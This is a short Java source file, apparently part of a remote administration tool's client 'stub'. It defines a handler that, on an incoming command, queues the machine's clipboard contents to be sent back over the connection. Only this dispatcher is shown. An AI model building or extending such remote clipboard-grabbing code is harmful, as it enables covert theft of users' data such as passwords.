package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet41Clipboard;


public class PacketCBOARD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet41Clipboard());
	}

}
